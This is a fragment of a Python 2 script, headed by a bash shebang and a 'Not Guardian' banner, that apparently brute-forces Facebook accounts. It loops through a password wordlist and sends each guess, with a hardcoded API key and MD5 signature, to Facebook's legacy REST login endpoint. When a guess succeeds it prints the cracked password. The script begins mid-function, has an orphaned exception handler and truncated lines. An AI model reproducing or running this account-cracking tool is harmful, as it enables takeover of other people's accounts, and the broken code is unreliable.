#!/bin/bash
#/////////////////////////////////////////////////////////////////////////////////////////////
#/////////////////////////////////////////////////////////////////////////////////////////////
#////                                                                                     ////
#////  _   _           _      _____                              _   _                    ////
#//// | \ | |         | |    / ____|                            | | (_)                   ////
#//// |  \| |   ___   | |_  | |  __   _   _    __ _   _ __    __| |  _    __ _   _ __     ////
#//// | . ` |  / _ \  | __| | | |_ | | | | |  / _` | | '__|  / _` | | |  / _` | | '_ \    ////                        
#//// | |\  | | (_) | | |_  | |__| | | |_| | | (_| | | |    | (_| | | | | (_| | | | | |   ////
#//// |_| \_|  \___/   \__|  \_____|  \__,_|  \__,_| |_|     \__,_| |_|  \__,_| |_| |_|   ////
#////                                                                                     ////
#/////////////////////////////////////////////////////////////////////////////////////////////
#/////////////////////////////////////////////////////////////////////////////////////////////

        passlist = raw_input("[*] Masukan World List ")
        if os.path.exists(passlist) != False:
                print(__banner__)
                print(" [+] Sedang Meng Crack Akun : {}".format(userid))
                print(" [+] Loading : {}".format(len(open(passlist,"r").read().split("\n"))))
                print(" [+] Cracking, Mohon Tunggu ...")
                for passwd in open(passlist,'r').readlines():
                        sys.stdout.write(u"\u001b[1000D[*] Mencoba {}".format(passwd.strip()))
                        sys.stdout.flush()
                        sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONge                       >
                        xx = hashlib.md5(sig).hexdigest()
                        data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JS                       >
                        response = urllib.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read()
                        if "error" in response:
                                pass
                        else:
                                print("\n\n[+] Ter Hack.. !!")
                                print("\n [+] Password : {}".format(passwd.strip()))
                                break
                print("\n\n[!] Selesai.. !!")
        else:
                print("FaceBrute: error: No such file or directory")
except KeyboardInterrupt:
        print("FaceBrute: error: Keyboard interrupt")
